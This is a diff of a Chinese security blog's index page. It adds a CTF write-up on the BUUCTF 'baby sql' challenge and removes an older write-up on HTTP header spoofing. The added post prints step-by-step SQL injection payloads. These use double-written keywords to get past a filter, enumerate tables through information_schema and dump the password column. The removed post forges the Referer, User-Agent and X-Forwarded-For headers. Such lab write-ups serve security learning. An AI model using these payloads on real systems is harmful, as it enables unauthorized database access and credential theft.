@@ -169,6 +169,61 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-baby" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/01/31/baby/" class="article-date">
+  	<time datetime="2021-01-31T07:30:50.000Z" itemprop="datePublished">2021-01-31</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/31/baby/">
+        17-buu练习baby sql
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>打开靶机：<br><img src="/2021/01/31/baby/baby1.png"><br>emmmm应该是lovesql惹的祸吧，euuu网站被日原谅我不厚道地笑了，应该是个加强版的注入！<br>先输入用户名和密码，看看什么反应。<br><img src="/2021/01/31/baby/baby2.png"><br>额…整一手万能密码：闭合双引号:<br>?username=admin&amp;password=admin’ or ‘1’=’1<br><img src="/2021/01/31/baby/baby3.png"><br>euuuuu报错了，说密码错误，那重新重新构造pyload：<br>?username=admin’&amp;password=admin or ‘1’=’1<br>看看是否报错<br><img src="/2021/01/31/baby/baby4.png"><br>emmmm我们的or去哪里啦？于是进一步测试，发现过滤了好多关键字，比如or, select,where, union。应该是用函数replace给我们替换成了空白字符<br>知道了这样，我们就进行绕过，于是拼接字符，无法用order by 1来判断字段个数，我们只有使用联合查询看他是否能查出来，应该列数不太多，于是我们构造<br>pyload：<br>?username=admin&amp;password=admin’ uunionnion sselectelect 1,2%23<br><img src="/2021/01/31/baby/baby5.png"><br>eeee应该是列数不对，再次构造payload：<br>?username=admin&amp;password=admin’ uunionnion sselectelect 1,2,3%23<br><img src="/2021/01/31/baby/baby6.png"><br>啊哈~对啦<br>可以看出有两个显示位：2和3<br>先查3的表：<br>?username=admin&amp;password=admin’ uunionnion sselectelect 1,2,group_concat(table_name)ffromrom infoorrmation_schema.tables wwherehere table_schema=database()%23<br><img src="/2021/01/31/baby/baby7.png"><br>查出来两张表b4bsql和geekuser<br>爆表b4bsql字段：<br>?username=admin&amp;password=admin’ uunionnion sselectelect 1,2,group_concat(column_name)ffromrom infoorrmation_schema.columns wwherehere table_name=’b4bsql’%23<br><img src="/2021/01/31/baby/baby8.png"><br>查出三个列字段：id,username,password<br>最后查数据，当然是查密码了，flag就在里面，别问我为什么，问就是直觉！<br>?username=admin&amp;password=admin’ uunionnion sselectelect 1,2,group_concat(passwoorrd)ffromrom b4bsql%23<br><img src="/2021/01/31/baby/baby9.png"><br>成功得到flag！<br><img src="/2021/01/31/baby/baby10.gif"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-suibianzhu" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1046,88 +1101,6 @@
 </li><li>4.用php://filter得到源码   谈一谈php://filter的妙用   php://filter技术分享
 </li><li>5.目录遍历漏洞
 </li>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-hhh" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/01/21/hhh/" class="article-date">
-  	<time datetime="2021-01-21T03:16:38.000Z" itemprop="datePublished">2021-01-21</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/21/hhh/">
-        7-buu练习[极客大挑战 2019]Http
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1>知识点</h1>
-<h3>1.Referer</h3>
-HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。Referer 常用在防盗链和防恶意请求中。传输referer需要在页面内添加相关的代码。
-<h3>2.User-Agent</h3>
-用来传输用户使用的是什么样的浏览器。有些网站为了防止爬虫，会检验User-Agent，只有当是用户访问的时候才会传输数据。
-<h3>3.X-Forwaeded-For</h3>
-X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。当今多数缓存服务器的用户为大型ISP，为了通过缓存的方式来降低他们的外部带宽，他们常常通过鼓励或强制用户使用代理服务器来接入互联网。有些情况下，这些代理服务器是透明代理，用户甚至不知道自己正在使用代理上网。
-如果没有XFF或者另外一种相似的技术，所有通过代理服务器的连接只会显示代理服务器的IP地址，而非连接发起的原始IP地址，这样的代理服务器实际上充当了匿名服务提供者的角色，如果连接的原始IP地址不可得，恶意访问的检测与预防的难度将大大增加。
-如果你使用透明代理上网，那么在透明代理发送给服务器端的HTTP请求中会包含x-forward-for信息
-简单来说就是用来传输最原始ip地址的,阻止匿名请求的，但是可以通过抓包来修改。
-<h1>题目</h1>
-<br>打开题目链接，查看源代码，如下：<br>
-<img src="/2021/01/21/hhh/eeee1.png">
-<br>存在Secret.php文件，访问该文件如下：<br>
-
-<p><img src="/2021/01/21/hhh/eeee2.png"></p>
-<p><br>采用burp抓包，如下：<br><br><img src="/2021/01/21/hhh/eeee3.png"><br><br>根据提示可知，要来自<a target="_blank" rel="noopener" href="https://www.sycsecret.com/">https://www.Sycsecret.com</a><br><br>采用Referer头：</p>
-<ul>
-<li>Referer:https://www.Sycsecret.com
-</li></ul>
-<img src="/2021/01/21/hhh/eeee4.png">
-<br>根据提示，要使用Syclover浏览器，将User-Agent头中的Firefox改成Syclover，如下图：<br>
-<img src="/2021/01/21/hhh/eeee5.png">
-<br>发现到现在还是没有出来，我们只能在本地访问，那么意思就是要我们使用127.0.0.1来访问，那么我们来添加一行：
-<ul>
-<li>X-Forwarded-For:127.0.0.1
- </li></ul>
-<img src="/2021/01/21/hhh/eeee6.png">
-<br>成功拿到flag~~
       
     </div>
     
